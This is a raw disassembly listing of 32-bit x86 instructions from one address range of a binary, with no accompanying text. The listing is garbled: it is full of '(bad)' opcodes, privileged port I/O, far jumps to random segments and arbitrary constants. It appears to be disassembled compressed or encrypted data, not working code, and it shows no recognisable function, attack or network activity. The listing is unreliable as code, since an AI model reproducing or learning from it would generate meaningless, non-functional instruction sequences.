  41c343:	pop    ss
  41c344:	loope  0x41c370
  41c346:	push   ebx
  41c347:	outs   dx,BYTE PTR ds:[esi]
  41c348:	(bad)  
  41c349:	std    
  41c34a:	hlt    
  41c34b:	mov    WORD PTR [eax+eiz*1],fs
  41c34e:	jp     0x41c3ce
  41c350:	leave  
  41c351:	cmp    al,0xba
  41c353:	or     eax,0xa6c2a323
  41c358:	push   esp
  41c359:	cmp    DWORD PTR [ecx],ebx
  41c35b:	hlt    
  41c35c:	inc    ebx
  41c35d:	mov    ch,0x34
  41c35f:	xchg   esi,eax
  41c360:	xchg   edi,eax
  41c361:	in     eax,0xcc
  41c363:	mov    ebp,0x5b708171
  41c368:	fnstenv [ecx]
  41c36a:	test   al,0x32
  41c36c:	aad    0xe
  41c36e:	in     eax,0x74
  41c370:	xchg   BYTE PTR ss:[eax-0xd],bh
  41c374:	test   BYTE PTR es:[esi+0x78],0xb
  41c379:	pop    edi
  41c37a:	mov    edx,0xd3a41a07
  41c37f:	inc    ebx
  41c380:	and    al,0x5e
  41c382:	pop    edx
  41c383:	xor    al,0x2b
  41c385:	icebp  
  41c386:	inc    ebx
  41c387:	jle    0x41c310
  41c389:	jo     0x41c3e1
  41c38b:	or     BYTE PTR gs:[eax-0x137f44ff],dh
  41c392:	int3   
  41c393:	inc    eax
  41c394:	pusha  
  41c395:	mov    cl,cl
  41c397:	jne    0x41c40b
  41c399:	ins    BYTE PTR es:[edi],dx
  41c39a:	add    DWORD PTR ds:0x2f6b0ceb,edx
  41c3a0:	sub    BYTE PTR [eax-0x733d9f12],0x36
  41c3a7:	cli    
  41c3a8:	or     al,0x6a
  41c3aa:	mov    ah,0xda
  41c3ac:	sub    esp,DWORD PTR [ebx+0x7b63b7ec]
  41c3b2:	jo     0x41c3b5
  41c3b4:	add    BYTE PTR [edi-0x5a799f81],bh
  41c3ba:	jo     0x41c431
  41c3bc:	jns    0x41c411
  41c3be:	rcl    DWORD PTR [ecx-0x25],0x25
  41c3c2:	xchg   ecx,eax
  41c3c3:	(bad)  
  41c3c4:	not    BYTE PTR [edx+0x4188c5e9]
  41c3ca:	add    BYTE PTR [ecx-0x7b],0x2b
  41c3ce:	(bad)  
  41c3cf:	and    eax,0xc60eac84
  41c3d4:	outs   dx,DWORD PTR ds:[esi]
  41c3d5:	push   cs
  41c3d6:	mov    DWORD PTR [esi+0x41],ebp
  41c3d9:	mov    eax,ds:0xd43450b5
  41c3de:	ret    
  41c3df:	das    
  41c3e0:	mov    ebp,0x1961121b
  41c3e5:	push   edi
  41c3e6:	sub    ebx,ebp
  41c3e8:	das    
  41c3e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3ea:	sbb    BYTE PTR [ebp+0x55],ah
  41c3ed:	fistp  QWORD PTR ds:0xaea1d868
  41c3f3:	push   ebp
  41c3f4:	jecxz  0x41c391
  41c3f6:	cmp    eax,0x1ed754e6
  41c3fb:	into   
  41c3fc:	mov    cx,0xb148
  41c400:	dec    esi
  41c401:	and    BYTE PTR ds:0xafd58841,al
  41c407:	and    dl,BYTE PTR [ebx-0x30055343]
  41c40d:	pop    edx
  41c40e:	out    0xd6,eax
  41c410:	add    ebx,DWORD PTR [eax+0x22]
  41c413:	call   0x6e312329
  41c418:	fdiv   st(7),st
  41c41a:	xlat   BYTE PTR ds:[ebx]
  41c41b:	mov    edi,0xe8354006
  41c420:	or     edi,DWORD PTR [esi+0x3c]
  41c423:	pop    edx
  41c424:	ret    0xb1d9
  41c427:	cmp    BYTE PTR [eax-0xc],ch
  41c42a:	arpl   WORD PTR [edx+0x9],sp
  41c42d:	mov    edi,0x6b02cd62
  41c432:	sar    DWORD PTR [edx-0x799f942f],cl
  41c438:	cwde   
  41c439:	fwait
  41c43a:	cmp    esi,0xf0a9ed3d
  41c440:	add    ebp,DWORD PTR [edi+0x4bf541a1]
  41c446:	(bad)  
  41c447:	lock and edi,DWORD PTR [edi]
  41c44a:	int    0xb6
  41c44c:	outs   dx,BYTE PTR ds:[esi]
  41c44d:	sub    al,0x78
  41c44f:	jmp    0x6353:0xa99b424c
  41c456:	test   al,0x57
  41c458:	inc    esp
  41c459:	mov    cl,0x18
  41c45b:	out    dx,eax
  41c45c:	neg    DWORD PTR [ecx]
  41c45e:	nop    DWORD PTR [ecx*4+0x52968a0e]
  41c466:	int    0xb8
  41c468:	pop    ecx
  41c469:	mov    bh,0x31
  41c46b:	ret    0x9ea6
  41c46e:	rcl    DWORD PTR [ecx+ebp*2+0x4b],0x12
  41c473:	add    eax,ebp
  41c475:	jge    0x41c490
  41c477:	push   es
  41c478:	ss in  eax,dx
  41c47a:	fmul   st,st(4)
  41c47c:	inc    ebx
  41c47d:	pop    esp
  41c47e:	mov    ebp,0x5be64db8
  41c483:	test   eax,0xec02f33
  41c488:	test   esp,ebx
  41c48a:	sbb    al,0x23
  41c48c:	call   0x5b13db4d
  41c491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c492:	mov    al,0x4c
  41c494:	in     eax,dx
  41c495:	ret    0x19e4
  41c498:	lods   al,BYTE PTR gs:[esi]
  41c49a:	push   es
  41c49b:	inc    eax
  41c49c:	dec    ebx
  41c49d:	add    eax,0xecf7cba9
  41c4a2:	mov    ebp,0xb1885ac2
  41c4a7:	addr16 ret 
  41c4a9:	loope  0x41c4db
  41c4ab:	add    BYTE PTR [edx+ecx*2-0x6c],dh
  41c4af:	stc    
  41c4b0:	mov    edi,0x8e07efad
  41c4b5:	(bad)  
  41c4b6:	cld    
  41c4b7:	in     al,0x9e
  41c4b9:	inc    edi
  41c4ba:	jnp    0x3ad74896
  41c4c0:	xor    al,0xa7
  41c4c2:	lods   al,BYTE PTR ds:[esi]
  41c4c3:	add    al,0x6e
  41c4c5:	repnz sbb al,0xa1
  41c4c8:	dec    edi
  41c4c9:	sub    BYTE PTR [eax+eiz*2],bh
  41c4cc:	adc    eax,0x93c17b75
  41c4d1:	xlat   BYTE PTR ds:[ebx]
  41c4d2:	push   edx
  41c4d3:	rcl    DWORD PTR [ebp-0x3c5c809f],cl
  41c4d9:	jmp    0x41c469
  41c4db:	and    al,0xc3
  41c4dd:	daa    
  41c4de:	test   BYTE PTR [esi+0x7a],bl
  41c4e1:	xchg   dh,bh
  41c4e3:	inc    edx
  41c4e4:	push   eax
  41c4e5:	inc    esi
  41c4e6:	mov    bh,0x96
  41c4e8:	pop    ds
  41c4e9:	call   0xadfba69f
  41c4ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4ef:	and    dh,BYTE PTR [edx+0x1c]
  41c4f2:	mov    esp,0x2e573ecc
  41c4f7:	imul   esp,DWORD PTR [edx+ebp*2-0x65],0xffffff85
  41c4fc:	sbb    al,0x23
  41c4fe:	in     eax,dx
  41c4ff:	and    ebx,DWORD PTR [esi+0x43]
  41c502:	adc    al,0xe9
  41c504:	pop    ebp
  41c505:	push   es
  41c506:	jo     0x41c48f
  41c508:	sar    dh,cl
  41c50a:	int    0x50
  41c50c:	(bad)  
  41c50d:	aad    0xc0
  41c50f:	int    0x64
  41c511:	or     DWORD PTR [esi+0x21],0x28
  41c515:	mov    edx,0x258e1da1
  41c51a:	mov    ch,ch
  41c51c:	mov    al,ds:0xc527b217
  41c521:	xchg   edx,eax
  41c522:	pushf  
  41c523:	cmc    
  41c524:	lods   al,BYTE PTR ds:[esi]
  41c525:	lahf   
  41c526:	push   esp
  41c527:	aad    0x3e
  41c529:	fucomi st,st(3)
  41c52b:	xor    BYTE PTR [esi+0x63],0x34
  41c52f:	stc    
  41c530:	add    al,0xc
  41c532:	call   FWORD PTR [ebx]
  41c534:	mov    ah,0xd7
  41c536:	jmp    0x41c512
  41c538:	call   DWORD PTR [ebx]
  41c53a:	mov    ch,0x99
  41c53c:	rcr    DWORD PTR [ecx],1
  41c53e:	jge    0x41c557
  41c540:	dec    eax
  41c541:	cmp    ch,BYTE PTR [edx+0x2ccf66b4]
  41c547:	sub    bh,BYTE PTR [edx+eiz*1]
  41c54a:	dec    edx
  41c54b:	pop    esi
  41c54c:	int3   
  41c54d:	push   esi
  41c54e:	shr    BYTE PTR [edx+0x60b72ce5],1
  41c554:	das    
  41c555:	(bad)  
  41c556:	sbb    dh,BYTE PTR [edx-0x2e]
  41c559:	dec    ebx
  41c55a:	add    DWORD PTR [ebp+0x4a],ebx
  41c55d:	mov    esi,0x6060b443
  41c562:	fimul  WORD PTR [edx]
  41c564:	sar    BYTE PTR [edx-0xa],cl
  41c567:	(bad)  
  41c568:	(bad)  
  41c569:	ins    BYTE PTR es:[edi],dx
  41c56a:	pop    ecx
  41c56b:	ror    DWORD PTR [ecx-0x283936f0],cl
  41c571:	jbe    0x41c5d4
  41c573:	idiv   DWORD PTR [esi-0x712f7f4b]
  41c579:	inc    ebx
  41c57a:	or     DWORD PTR [ecx-0x507be13],esp
  41c580:	ss inc esp
  41c582:	outs   dx,BYTE PTR ds:[esi]
  41c583:	cli    
  41c584:	mov    bl,0xd9
  41c586:	sar    DWORD PTR [ecx-0x49],cl
  41c589:	stos   BYTE PTR es:[edi],al
  41c58a:	cmp    eax,0xd20e09ef
  41c58f:	add    eax,0x2f7d0cfe
  41c594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c595:	(bad)  ss:[ebp-0x66a3b4cb]
  41c59c:	cmp    al,0xb4
  41c59e:	xchg   DWORD PTR [ebp-0x54],edx
  41c5a1:	sub    al,0xf3
  41c5a3:	les    edx,FWORD PTR [edi+edx*8-0x6f]
  41c5a7:	fist   DWORD PTR [ecx-0x16e6c5c7]
  41c5ad:	lods   eax,DWORD PTR ds:[esi]
  41c5ae:	add    eax,0x7f56b6f
  41c5b3:	fs mov dh,0xd4
  41c5b6:	stos   BYTE PTR es:[edi],al
  41c5b7:	or     ecx,ebx
  41c5b9:	jb     0x41c5ce
  41c5bb:	outs   dx,BYTE PTR ds:[esi]
  41c5bc:	loop   0x41c5bb
  41c5be:	mov    dh,0x32
  41c5c0:	(bad)  
  41c5c1:	mov    cl,0xcf
  41c5c3:	cwde   
  41c5c4:	mov    eax,0x63eaf301
  41c5c9:	dec    ecx
  41c5ca:	lods   al,BYTE PTR ss:[esi]
  41c5cc:	test   BYTE PTR [ecx],0x9b
  41c5cf:	aad    0xb3
  41c5d1:	clc    
  41c5d2:	add    esp,esp
  41c5d4:	enter  0x9824,0x23
  41c5d8:	ror    DWORD PTR [ecx+eax*1],0xa2
  41c5dc:	je     0x41c646
  41c5de:	pop    ebp
  41c5df:	inc    esp
  41c5e0:	add    BYTE PTR [ebx+0x6d],dh
  41c5e3:	pusha  
  41c5e4:	(bad)  
  41c5e6:	sbb    eax,0xf4b8205f
  41c5eb:	dec    ebx
  41c5ec:	jl     0x41c5c6
  41c5ee:	mov    BYTE PTR [ebx],0xca
  41c5f1:	dec    edi
  41c5f2:	pxor   mm3,mm0
  41c5f5:	div    BYTE PTR [edx]
  41c5f7:	inc    edx
  41c5f8:	inc    edi
  41c5f9:	ja     0x41c5e7
  41c5fb:	sub    al,0xc6
  41c5fd:	int3   
  41c5fe:	xor    cl,BYTE PTR [eax+esi*2-0x7ba5c34e]
  41c605:	hlt    
  41c606:	sub    ebp,ebp
  41c608:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c609:	mov    ah,0x36
  41c60b:	fisttp QWORD PTR [eax-0x58]
  41c60e:	cld    
  41c60f:	cs popaw 
  41c612:	nop
  41c613:	in     eax,dx
  41c614:	fcom   DWORD PTR [ecx]
  41c616:	addr16 or ecx,ebx
  41c619:	push   cs
  41c61a:	jno    0x41c64d
  41c61c:	jae    0x41c5e0
  41c61e:	(bad)  
  41c620:	jo     0x41c60b
  41c622:	clc    
  41c623:	xor    DWORD PTR [ebp+0x71030ec2],esi
  41c629:	inc    ebp
  41c62a:	stc    
  41c62b:	and    BYTE PTR [eax],ah
  41c62d:	sbb    esp,0x640c56ff
  41c633:	pop    edi
  41c634:	arpl   WORD PTR [ecx+0x10],dx
  41c637:	push   esi
  41c638:	fidivr WORD PTR ds:0x4275
  41c63d:	sbb    BYTE PTR [eax+0x4b],bl
  41c640:	jmp    0xf413:0xaa0dce25
  41c647:	in     al,0x36
  41c649:	lahf   
  41c64a:	mov    bh,0x4d
  41c64c:	push   cs
  41c64d:	dec    edx
  41c64e:	inc    ecx
  41c64f:	in     al,0x8e
  41c651:	ins    DWORD PTR es:[edi],dx
  41c652:	cmp    al,0x58
  41c654:	cld    
  41c655:	lahf   
  41c656:	lea    esi,[edi+0x42c87068]
  41c65c:	adc    BYTE PTR [esi],ch
  41c65e:	jbe    0x41c6b0
  41c660:	push   0xfd642164
  41c665:	or     ah,BYTE PTR [ebx+0x44]
  41c668:	sahf   
  41c669:	dec    esp
  41c66a:	mov    al,ds:0xce1c4946
  41c66f:	in     eax,dx
  41c670:	cmp    DWORD PTR [eax+0x74],esi
  41c673:	lock leave 
  41c675:	mov    bl,ah
  41c677:	sub    DWORD PTR [ebp+0x15],ebp
  41c67a:	and    BYTE PTR [edx-0x2c],0x71
  41c67e:	out    dx,eax
  41c67f:	inc    ebp
  41c680:	adc    BYTE PTR [edi+0x3e23c4fa],cl
  41c686:	fdiv   QWORD PTR [esp+esi*8]
  41c689:	test   BYTE PTR [esi],bh
  41c68b:	mov    WORD PTR [ebx+esi*4-0x584ede32],ds
  41c692:	les    eax,FWORD PTR [eax-0x2c6a13e9]
  41c698:	pusha  
  41c699:	pop    edx
  41c69a:	test   DWORD PTR [ecx+0x4d90f0f5],edx
  41c6a0:	push   0xffffffa4
  41c6a2:	dec    edi
  41c6a3:	cmp    BYTE PTR [ebp-0x3a3d61ad],dl
  41c6a9:	call   0xdbc0a7f2
  41c6ae:	adc    DWORD PTR [esi-0x6f4c7781],edi
  41c6b4:	out    0x3e,al
  41c6b6:	adc    ecx,DWORD PTR [ebx]
  41c6b8:	mov    ds,WORD PTR [ebx-0x71ec04ea]
  41c6be:	fistp  QWORD PTR [edx-0x1e43658]
  41c6c4:	mov    bh,0x94
  41c6c6:	mov    DWORD PTR fs:[ebx],esp
  41c6c9:	mov    cl,0xbd
  41c6cb:	pusha  
  41c6cc:	ret    
  41c6cd:	and    DWORD PTR [ebx+0x20],ebp
  41c6d0:	mov    esp,0xb8149799
  41c6d5:	loop   0x41c6bf
  41c6d7:	xchg   ebp,eax
  41c6d8:	or     al,0x6f
  41c6da:	inc    esp
  41c6db:	fild   WORD PTR [ecx]
  41c6dd:	les    eax,FWORD PTR [edi+0x51]
	...
  41c8b4:	adc    eax,0x773f6240
  41c8b9:	aas    
  41c8ba:	pop    ebp
  41c8bb:	push   0xffffff86
  41c8bd:	jb     0x41c921
  41c8bf:	stc    
  41c8c0:	out    dx,al
  41c8c1:	and    DWORD PTR [esi],ebx
  41c8c3:	jne    0x41c8ca
  41c8c5:	mov    WORD PTR [ecx],es
  41c8c7:	add    BYTE PTR [esi],bl
  41c8c9:	pop    es
  41c8ca:	add    BYTE PTR [eax],al
  41c8cc:	popa   
  41c8cd:	sbb    eax,0xb9d07b07
  41c8d2:	push   cs
  41c8d3:	addr16 cwde 
  41c8d5:	jmp    0xe1b850d7
  41c8da:	mov    DWORD PTR [eax],edi
  41c8dc:	and    DWORD PTR [edx-0x62],ebp
  41c8df:	inc    ebp
  41c8e0:	enter  0x7f58,0xfe
  41c8e4:	inc    ecx
  41c8e5:	ins    BYTE PTR es:[edi],dx
  41c8e6:	pushf  
  41c8e7:	dec    ebx
  41c8e8:	les    esp,FWORD PTR [ebx]
  41c8ea:	arpl   WORD PTR [edx+0x14],sp
  41c8ed:	std    
  41c8ee:	out    dx,eax
  41c8ef:	outs   dx,BYTE PTR ds:[esi]
  41c8f0:	rcr    BYTE PTR [ecx-0x39688739],1
  41c8f6:	jle    0x41c956
  41c8f8:	cli    
  41c8f9:	xchg   ecx,eax
  41c8fa:	mov    ebx,0x6e8a9d26
  41c8ff:	call   0x9830:0x936c2e25
  41c906:	jmp    0xe109c5b2
  41c90b:	pop    es
  41c90c:	inc    eax
  41c90d:	adc    edi,DWORD PTR [edi]
  41c90f:	shr    bl,cl
  41c911:	call   0x6264ea12
  41c916:	push   eax
  41c917:	sub    DWORD PTR [ebx],ebp
  41c919:	xlat   BYTE PTR ds:[ebx]
  41c91a:	mov    al,ds:0x620eb8a2
  41c91f:	push   eax
  41c920:	pop    es
  41c921:	ror    BYTE PTR [edx+eiz*1],cl
  41c924:	jne    0x41c925
  41c926:	mov    esi,0x7c9e4b9a
  41c92b:	dec    BYTE PTR [edi]
  41c92d:	in     eax,dx
  41c92e:	pop    es
  41c92f:	adc    eax,0xb3c7fc2d
  41c934:	push   0x331748d
  41c939:	mov    cl,0x88
  41c93b:	test   al,0xe4
  41c93d:	xor    cl,BYTE PTR [ecx+0x43]
  41c940:	(bad)  
  41c941:	nop
  41c942:	jo     0x41c98f
  41c944:	mov    DWORD PTR [ecx],esp
  41c946:	xchg   ecx,eax
  41c947:	jecxz  0x41c8d3
  41c949:	or     esp,0xffffff99
  41c94c:	mov    al,0x61
  41c94e:	push   eax
  41c94f:	sub    al,0xa1
  41c951:	pop    ebp
  41c952:	sub    eax,0x47177916
  41c957:	pop    ecx
  41c958:	(bad)  
  41c959:	ret    
  41c95a:	ficom  DWORD PTR [edx-0x5b89d0e7]
  41c960:	xlat   BYTE PTR ds:[ebx]
  41c961:	bound  edi,QWORD PTR [ecx-0x78]
  41c964:	mov    dl,0x26
  41c966:	xchg   ebx,eax
  41c967:	cli    
  41c968:	xchg   BYTE PTR [eax],al
  41c96a:	es out dx,al
  41c96c:	sbb    al,0x53
  41c96e:	jp     0x41c922
  41c970:	ss mov edx,0x22444780
  41c976:	cs cmc 
  41c978:	dec    esp
  41c979:	icebp  
  41c97a:	push   DWORD PTR [ebx-0x6d029080]
  41c980:	std    
  41c981:	adc    eax,0xb447a42d
  41c986:	mov    esi,0xeaa0f8b8
  41c98b:	pop    esp
  41c98c:	dec    esp
  41c98d:	imul   edi,DWORD PTR [esi-0x25],0x7f
  41c991:	loope  0x41c946
  41c993:	jg     0x41ca0b
  41c995:	cdq    
  41c996:	lahf   
  41c997:	(bad)  
  41c998:	mov    ebp,0x9a117d70
  41c99d:	and    ebx,eax
  41c99f:	retf   0x947d
  41c9a2:	aaa    
  41c9a3:	out    0xd0,al
  41c9a5:	lock ss lock jp 0x41c95e
  41c9aa:	or     eax,0xd647fe28
  41c9af:	inc    edx
  41c9b0:	(bad)  
  41c9b2:	dec    BYTE PTR [ebx]
  41c9b4:	js     0x41c99b
  41c9b6:	mov    ?,edx
  41c9b8:	dec    esi
  41c9b9:	dec    esp
  41c9ba:	nop
  41c9bb:	jl     0x41c94c
  41c9bd:	inc    eax
  41c9be:	(bad)  
  41c9bf:	sti    
  41c9c0:	and    edi,DWORD PTR [edx]
  41c9c2:	test   BYTE PTR [esp+esi*2],cl
  41c9c5:	fwait
  41c9c6:	sbb    esp,ebx
  41c9c8:	xchg   esp,eax
  41c9c9:	bound  edx,QWORD PTR [ecx+edx*2]
  41c9cc:	xor    cl,bh
  41c9ce:	in     al,0x32
  41c9d0:	or     bl,al
  41c9d2:	jle    0x41c961
  41c9d4:	inc    ecx
  41c9d5:	cmp    al,BYTE PTR [ebp-0x53c45a69]
  41c9db:	fsub   QWORD PTR [eax-0x5d6a7994]
  41c9e1:	cwde   
  41c9e2:	inc    ecx
  41c9e3:	out    dx,eax
  41c9e4:	pop    ecx
  41c9e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9e6:	loopne 0x41ca3d
  41c9e8:	mov    DWORD PTR [eax+ebp*4],esp
  41c9eb:	icebp  
  41c9ec:	sub    ch,BYTE PTR [edx-0x16]
  41c9ef:	push   esi
  41c9f0:	popf   
  41c9f1:	jne    0x41ca6a
  41c9f3:	sti    
  41c9f4:	mov    bh,0xfd
  41c9f6:	cli    
  41c9f7:	lea    edi,[edi]
  41c9f9:	fs pop ebx
  41c9fb:	cmp    esi,edi
  41c9fd:	jae    0x41ca68
  41c9ff:	popf   
  41ca00:	ins    BYTE PTR es:[edi],dx
  41ca01:	dec    edi
  41ca02:	sbb    DWORD PTR [ecx-0x78],ebp
  41ca05:	out    0xc4,al
  41ca07:	out    dx,eax
  41ca08:	sahf   
  41ca09:	ret    
  41ca0a:	xor    DWORD PTR cs:[ecx-0x4d],esp
  41ca0e:	(bad)  
  41ca0f:	sub    cl,BYTE PTR [ebx-0x5c]
  41ca12:	es sub al,0x5a
  41ca15:	popa   
  41ca16:	adc    eax,0xb517671f
  41ca1b:	jl     0x41ca6a
  41ca1d:	sub    al,0xb2
  41ca1f:	jae    0x41caa0
  41ca21:	icebp  
  41ca22:	or     eax,0xba59331e
  41ca27:	enter  0x5cd0,0x4f
  41ca2b:	ds cld 
  41ca2d:	pop    eax
  41ca2e:	stos   BYTE PTR es:[edi],al
  41ca2f:	das    
  41ca30:	xlat   BYTE PTR ds:[ebx]
  41ca31:	les    ebp,FWORD PTR [eax-0x4cc3ea5b]
  41ca37:	mov    BYTE PTR [edx],ah
  41ca39:	sub    al,0xa9
  41ca3b:	call   0x9a6c:0xbc94a149
  41ca42:	stc    
  41ca43:	rcl    BYTE PTR [ecx],0x43
  41ca46:	push   esi
  41ca47:	dec    edx
  41ca48:	push   edx
  41ca49:	pusha  
  41ca4a:	jle    0x41ca15
  41ca4c:	dec    eax
  41ca4d:	xchg   edi,edi
  41ca4f:	pusha  
  41ca50:	sbb    al,0x29
  41ca52:	int    0x87
  41ca54:	push   edi
  41ca55:	xchg   ebp,eax
  41ca56:	(bad)  
  41ca58:	mov    eax,0xb63e187c
  41ca5d:	cmp    eax,edx
  41ca5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca60:	sti    
  41ca61:	pop    ecx
  41ca62:	cdq    
  41ca63:	mov    ah,0x36
  41ca65:	ret    0xa8d6
  41ca68:	jmp    0x215118a6
  41ca6d:	xchg   esi,eax
  41ca6e:	cmp    eax,0x37c7df4b
  41ca73:	mov    al,0xd
  41ca75:	jmp    0xfb7c6844
  41ca7a:	pop    ecx
  41ca7b:	imul   ecx,DWORD PTR [edx],0x15
  41ca7e:	pushf  
  41ca7f:	xchg   ebp,eax
  41ca80:	fs sub eax,0x8d68a5a2
  41ca87:	push   es
  41ca88:	gs push ebx
  41ca8a:	jmp    0x41ca9e
  41ca8c:	fistp  QWORD PTR [ebp-0x2a8c362b]
  41ca92:	pusha  
  41ca93:	loope  0x41caec
  41ca95:	jmp    0xbe6303f0
  41ca9a:	jl     0x41ca3f
  41ca9c:	sbb    DWORD PTR [ebp+0x6ba56bfa],ecx
  41caa2:	pop    ds
  41caa3:	ret    0xaa47
  41caa6:	ins    DWORD PTR es:[edi],dx
  41caa7:	push   cs
  41caa8:	sub    ch,BYTE PTR [edx+0x4b1543ef]
  41caae:	xchg   ecx,eax
  41caaf:	mul    BYTE PTR [edx]
  41cab1:	adc    al,0x60
  41cab3:	mov    cl,0xa0
  41cab5:	stos   DWORD PTR es:[edi],eax
  41cab6:	rol    eax,cl
  41cab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cab9:	mov    bl,BYTE PTR [edx+ebp*8-0x25]
  41cabd:	ins    DWORD PTR es:[edi],dx
  41cabe:	mov    BYTE PTR [ebx],bh
  41cac0:	sub    ebp,0x1
  41cac3:	cmp    DWORD PTR [edx-0x4f079c1b],esi
  41cac9:	adc    DWORD PTR [edx+0x36],ebp
  41cacc:	in     al,0xed
  41cace:	mov    dl,0x66
  41cad0:	loopne 0x41ca71
  41cad2:	lea    edi,[ebx-0x5a112229]
  41cad8:	sbb    BYTE PTR [edx-0x7a],al
  41cadb:	bnd ja 0x41cb4d
  41cade:	test   eax,0xdaa84258
  41cae3:	rcl    edx,1
  41cae5:	daa    
  41cae6:	aam    0x29
  41cae8:	jp     0x41cace
  41caea:	jno    0x41caff
  41caec:	sub    dh,cl
  41caee:	stos   BYTE PTR es:[edi],al
  41caef:	outs   dx,BYTE PTR ds:[esi]
  41caf0:	pop    ebx
  41caf1:	ror    BYTE PTR [ebx-0xee4bbe0],0xa5
  41caf8:	bound  eax,QWORD PTR [eax]
  41cafa:	dec    esp
  41cafb:	sub    ch,BYTE PTR [eax+ebx*8]
  41cafe:	cdq    
  41caff:	shl    al,cl
  41cb01:	fiadd  WORD PTR [edx-0xd]
  41cb04:	xchg   edi,eax
  41cb05:	add    al,0xbf
  41cb07:	mov    edx,0xcd416f8
  41cb0c:	fstp   QWORD PTR [ebp+0x63]
  41cb0f:	xlat   BYTE PTR ds:[ebx]
  41cb10:	fcmovnu st,st(0)
  41cb12:	sub    dh,cl
  41cb14:	xchg   edx,eax
  41cb15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb16:	dec    edi
  41cb17:	pop    eax
  41cb18:	mov    DWORD PTR [esi-0xeb02d5b],edx
  41cb1e:	mov    ah,0xaa
  41cb20:	test   DWORD PTR es:[edi+0x10],edi
  41cb24:	call   0x7e5a:0xd0c4d68c
  41cb2b:	mov    al,0xb3
  41cb2d:	test   DWORD PTR [ebp+esi*4+0x79],eax
  41cb31:	pop    ebx
  41cb32:	dec    esp
  41cb33:	mov    ebp,0x8ba2d642
  41cb38:	popf   
  41cb39:	cli    
  41cb3a:	mov    eax,0x9d26914f
  41cb3f:	jae    0x41cb20
  41cb41:	xchg   DWORD PTR [ebx],eax
  41cb43:	rcr    bh,1
  41cb45:	or     al,0x62
  41cb47:	and    BYTE PTR [edi-0x52],0xc
  41cb4b:	scas   eax,DWORD PTR es:[edi]
  41cb4c:	rol    BYTE PTR [edi+0x27],0x3
  41cb50:	sub    DWORD PTR [edx],edx
  41cb52:	pop    ds
  41cb53:	cli    
  41cb54:	stos   BYTE PTR es:[edi],al
  41cb55:	fisub  DWORD PTR [edx-0x554e8155]
  41cb5b:	mov    ah,0xb
  41cb5d:	lods   eax,DWORD PTR ds:[esi]
  41cb5e:	int3   
  41cb5f:	add    eax,DWORD PTR [eax]
  41cb61:	fld    QWORD PTR [esi]
  41cb63:	jmp    0x74a3:0x29142b86
  41cb6a:	loopne 0x41caed
  41cb6c:	cdq    
  41cb6d:	adc    bh,dh
  41cb6f:	or     eax,0x1ba037c
  41cb74:	jecxz  0x41cb4e
  41cb76:	sbb    cl,BYTE PTR [eax+0x3a28f767]
  41cb7c:	inc    eax
  41cb7d:	sub    al,0x9f
  41cb7f:	and    al,0xc5
  41cb81:	ins    BYTE PTR es:[edi],dx
  41cb82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb83:	dec    ebp
  41cb84:	data16 (bad) 
  41cb86:	xchg   edi,eax
  41cb87:	fwait
  41cb88:	adc    al,0xe7
  41cb8a:	lea    eax,[edx]
  41cb8c:	dec    ebp
  41cb8d:	scas   al,BYTE PTR es:[edi]
  41cb8e:	mov    bl,0x7f
  41cb90:	xor    cl,BYTE PTR [ecx+0x2b208d7a]
  41cb96:	mov    dh,0xe
  41cb98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb99:	cld    
  41cb9a:	test   DWORD PTR [ebp-0x56],edx
  41cb9d:	loop   0x41cb34
  41cb9f:	or     esi,DWORD PTR [esi-0x4d1eb95c]
  41cba5:	xor    ah,BYTE PTR [edi]
  41cba7:	je     0x41cb9a
  41cba9:	icebp  
  41cbaa:	fstp   TBYTE PTR [edi-0x79167d25]
  41cbb0:	loope  0x41cb64
  41cbb2:	dec    ecx
  41cbb3:	in     al,dx
  41cbb4:	push   esi
  41cbb5:	in     eax,dx
  41cbb6:	test   DWORD PTR [eax+0x4567b180],ebx
  41cbbc:	cld    
  41cbbd:	sub    BYTE PTR ds:0x95b196a,bl
  41cbc3:	sub    DWORD PTR [eax],esi
  41cbc5:	xor    eax,0x7bf7fce6
  41cbca:	jne    0x41cc38
  41cbcc:	xchg   DWORD PTR ds:0x3edeea1e,edx
  41cbd2:	fdiv   DWORD PTR [ecx+0x13dcbfec]
  41cbd8:	lds    edi,FWORD PTR [edx+0x41]
  41cbdb:	cmp    BYTE PTR [ebx+eiz*8],dh
  41cbde:	dec    esp
  41cbdf:	push   edx
  41cbe0:	(bad)  [ecx+eax*8]
  41cbe3:	mov    ebx,0xf1aece93
  41cbe8:	cdq    
  41cbe9:	xlat   BYTE PTR ds:[ebx]
  41cbea:	jg     0x41cbaa
  41cbec:	movzx  ebx,BYTE PTR [ebx-0x4d]
  41cbf0:	(bad)  
  41cbf1:	(bad)  
  41cbf2:	pusha  
  41cbf3:	sub    eax,0xf231a0e5
  41cbf8:	adc    al,0xde
  41cbfa:	pop    esp
  41cbfb:	push   cs
  41cbfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbfd:	popf   
  41cbfe:	dec    edi
  41cbff:	enter  0xb227,0x68
  41cc03:	lods   al,BYTE PTR ds:[esi]
  41cc04:	(bad)  
  41cc05:	leave  
  41cc06:	inc    ebp
  41cc07:	sub    ebp,DWORD PTR [ebx-0x1f]
  41cc0a:	out    dx,eax
  41cc0b:	sub    BYTE PTR [ebx-0x8],cl
  41cc0e:	push   esp
  41cc0f:	imul   BYTE PTR [edi-0x50f75310]
  41cc15:	rcl    BYTE PTR [edi+0x68506382],0xc3
  41cc1c:	ret    
  41cc1d:	mov    ds:0x6ecee48b,eax
  41cc22:	jmp    0x41cbfa
  41cc24:	je     0x41cbf8
  41cc26:	aad    0xc3
  41cc28:	mov    ah,0xb
  41cc2a:	mov    al,ds:0xfefd142f
  41cc2f:	(bad)  
  41cc30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc31:	ins    DWORD PTR es:[edi],dx
  41cc32:	fsubr  DWORD PTR [esi-0x29]
